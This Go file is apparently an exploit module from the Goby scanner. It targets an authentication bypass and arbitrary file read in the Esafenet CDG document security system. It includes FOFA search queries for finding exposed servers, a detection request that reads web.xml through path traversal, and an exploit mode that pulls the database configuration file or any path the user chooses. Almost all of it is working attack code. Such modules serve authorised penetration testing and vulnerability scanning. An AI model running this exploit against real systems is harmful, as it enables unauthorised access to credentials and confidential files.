package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "ESAFENET CDG /CDGServer3/document/UploadFileManagerService File Reading Vulnerability",
    "Description": "<p>Esafenet Electronic Document Security Management System (CDG) is an electronic document security encryption software. The system uses the transparent encryption technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encryption and protection of electronic documents. Life cycle protection, the system has a variety of encryption methods such as transparent encryption, active encryption, intelligent encryption, etc. Users can deploy gradient document encryption protection with different strengths according to the degree of confidentiality of the department (such as core department and ordinary department) to realize the organic combination of technology, management and audit, and internal construction. Build a three-dimensional overall information leakage prevention system to achieve a balance between cost, efficiency and safety, and realize the data security of electronic documents.</p><p>The UploadFileManagerService interface of Esafenet Electronic Document Security Management System has permission bypass and file reading vulnerabilities in the authentication process. Through this interface, attackers can construct malicious requests to bypass permissions and read any files in the system at will.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2024-05-13",
    "PostTime": "2024-05-13",
    "Author": "Town",
    "FofaQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "GobyQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "Level": "3",
    "Impact": "<p>The UploadFileManagerService interface of Esafenet Electronic Document Security Management System has permission bypass and file reading vulnerabilities in the authentication process. Through this interface, attackers can construct malicious requests to bypass permissions and read any files in the system at will.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.esafenet.com/product/277483397\">http://www.esafenet.com/product/277483397</a></p><p>2. Set the access policy and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "SQLDBINFO,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/CDGServer3/document/UploadFileManagerService;login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "command=ViewUploadFile&filePath=./../webapps/CDGServer3/WEB-INF/web.xml&fileName1="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml version=\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<web-app>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/CDGServer3/document/UploadFileManagerService;login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "command=ViewUploadFile&filePath={{{FilePath}}}&fileName1="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml version=\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.6",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 /CDGServer3/document/UploadFileManagerService 文件读取漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。<br></p><p>亿赛通电子文档安全管理系统的UploadFileManagerService接口在鉴权过程中存在权限绕过和文件读取漏洞。攻击者可通过该接口构造绕过权限的恶意请求，任意读取系统中的任何文件。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.esafenet.com/product/277483397\">http://www.esafenet.com/product/277483397</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统的UploadFileManagerService接口在鉴权过程中存在权限绕过和文件读取漏洞。攻击者可通过该接口构造绕过权限的恶意请求，任意读取系统中的任何文件。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ESAFENET CDG /CDGServer3/document/UploadFileManagerService File Reading Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>Esafenet Electronic Document Security Management System (CDG) is an electronic document security encryption software. The system uses the transparent encryption technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encryption and protection of electronic documents. Life cycle protection, the system has a variety of encryption methods such as transparent encryption, active encryption, intelligent encryption, etc. Users can deploy gradient document encryption protection with different strengths according to the degree of confidentiality of the department (such as core department and ordinary department) to realize the organic combination of technology, management and audit, and internal construction. Build a three-dimensional overall information leakage prevention system to achieve a balance between cost, efficiency and safety, and realize the data security of electronic documents.</p><p>The UploadFileManagerService interface of Esafenet Electronic Document Security Management System has permission bypass and file reading vulnerabilities in the authentication process. Through this interface, attackers can construct malicious requests to bypass permissions and read any files in the system at will.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.esafenet.com/product/277483397\">http://www.esafenet.com/product/277483397</a></p><p>2. Set the access policy and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">The UploadFileManagerService interface of Esafenet Electronic Document Security Management System has permission bypass and file reading vulnerabilities in the authentication process. Through this interface, attackers can construct malicious requests to bypass permissions and read any files in the system at will.</span><br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10948"
}`

	postOrGet_sdkjfhlkas := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/CDGServer3/document/UploadFileManagerService;login")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		//设置请求头
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		postRequestConfig.Data = "command=ViewUploadFile&filePath=" + fileUrl + "&fileName1="
		//请求
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", err
		}
		respTxt := resp.Utf8Html
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/CDGServer3/document/UploadFileManagerService"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"./../webapps/CDGServer3/WEB-INF/web.xml": "<web-app>",
			}
			// 函数继承
			uploadFileFunc := postOrGet_sdkjfhlkas

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"SQLDBINFO": {"./../webapps/CDGServer3/WEB-INF/classes/common.cfg.xml", "<db-config"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_sdkjfhlkas

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}
